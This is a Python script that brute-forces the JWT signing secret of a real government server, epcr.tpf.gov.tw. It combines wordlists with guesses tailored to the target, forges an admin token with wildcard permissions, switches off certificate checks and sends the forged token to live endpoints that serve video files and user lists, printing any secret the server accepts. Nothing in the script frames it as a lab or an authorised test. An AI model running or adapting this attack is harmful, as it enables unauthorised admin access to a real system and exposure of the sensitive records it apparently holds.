import jwt, httpx, ssl, sys, time

# Build combined secret list
secrets = []
for f in ["/tmp/secret_wordlist.txt", "/tmp/wordlist.txt"]:
    try:
        with open(f) as fh:
            for line in fh:
                line = line.strip()
                if line and not line.startswith("#"):
                    secrets.append(line)
    except Exception as e:
        print("read err", f, e)

# Extra high-probability candidates
extra = [
    "keyboard cat", "secret", "jwt", "supersecret", "shhhhh", "123456",
    "password", "letmein", "admin", "express", "express-session",
    "express_session", "session_secret", "sessionSecret", "app_secret",
    "epcr", "EPCR", "epcr_secret", "EPCR_SECRET", "epcrserver", "EPCRServer",
    "tpf", "TPF", "tpf_secret", "epcr.tpf.gov.tw", "EPCRServerAuthToken",
    "AuthServerAuthToken", "AuthServerSecret", "authSecret", "auth_secret",
    "newtpc", "NTPC", "ntpc_secret", "nycd", "NYCD", "hospital", "ePCR2",
    "keyboardcat", "jwtsecret", "jwt-secret", "jwt_secret_key",
    "secretkey", "SECRETKEY", "signingkey", "signing_key", "s3cr3t",
    "pepper", "spice", "salt", "token", "token_secret", "auth_key",
    "authkey", "server_secret", "serversecret", "node_secret", "express2",
    "default", "changeme", "example", "test", "demo", "placeholder",
    "mysecret", "my-secret", "my_secret", "mySecret", "yoursecret",
    "super-secret", "supersecret2", "secret123", "secret1234", "jwtsecret123",
    "2024", "2023", "2022", "keyboard cat!", "cats", "cat",
]
for e in extra:
    if e not in secrets:
        secrets.append(e)

# De-dupe preserving order, cap length
seen = set(); uniq = []
for s in secrets:
    if s not in seen and len(s) < 256:
        seen.add(s); uniq.append(s)
secrets = uniq
print("total secrets:", len(secrets))

# Realistic admin payload (Angular app expects permissions + user.role)
def make_payload():
    return {
        "sub": "1",
        "user": {"id": "1", "name": "admin", "role": "ADMIN"},
        "role": "ADMIN",
        "permissions": ["*"],
        "iat": int(time.time()) - 60,
        "exp": int(time.time()) + 3600,
    }

# Probe endpoints: (name, url, token_param_style)
probes = [
    ("4000_video_getFile", "https://epcr.tpf.gov.tw:4000/videoData/getFile/?uuid=test", "header"),
    ("4000_api",          "https://epcr.tpf.gov.tw:4000/api/test", "header"),
    ("4004_api",          "https://epcr.tpf.gov.tw:4004/api/users", "header"),
]

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

results = []
def is_accept(r, body):
    # accepted if NOT a signature/token-rejected 401
    b = body.lower()
    rejected = ("no authorization token" in b) or ("invalid signature" in b) or ("jwt signature" in b) or ("malformed" in b)
    if r.status_code == 401 and rejected:
        return False
    return r.status_code != 401  # anything non-401 means token accepted

with httpx.Client(verify=ctx, timeout=15) as cl:
    # First, baseline: no token, capture the reject signature
    base = cl.get(probes[0][1])
    print("BASELINE no-token", base.status_code, base.text[:80])
    # baseline with bad-signature token
    bad = jwt.encode(make_payload(), "totallywrongsecret123", algorithm="HS256")
    b2 = cl.get(probes[0][1], headers={"Authorization": "Bearer " + bad})
    print("BASELINE bad-sig", b2.status_code, b2.text[:80])

    for i, sec in enumerate(secrets):
        tok = jwt.encode(make_payload(), sec, algorithm="HS256")
        hit = False
        for name, url, style in probes:
            try:
                if style == "header":
                    r = cl.get(url, headers={"Authorization": "Bearer " + tok})
                else:
                    r = cl.get(url, params={"token": tok})
            except Exception as e:
                continue
            if is_accept(r, r.text):
                results.append((sec, name, url, r.status_code, r.text[:120]))
                hit = True
                break
        if hit:
            break
        if i % 500 == 0:
            print("progress", i, "/", len(secrets))
        time.sleep(0.01)

print("==== RESULTS ====")
if not results:
    print("NO SECRET MATCHED - all tokens rejected")
else:
    for sec, name, url, code, body in results:
        print("SECRET FOUND:", repr(sec))
        print("  probe:", name, url)
        print("  status:", code)
        print("  body:", body)
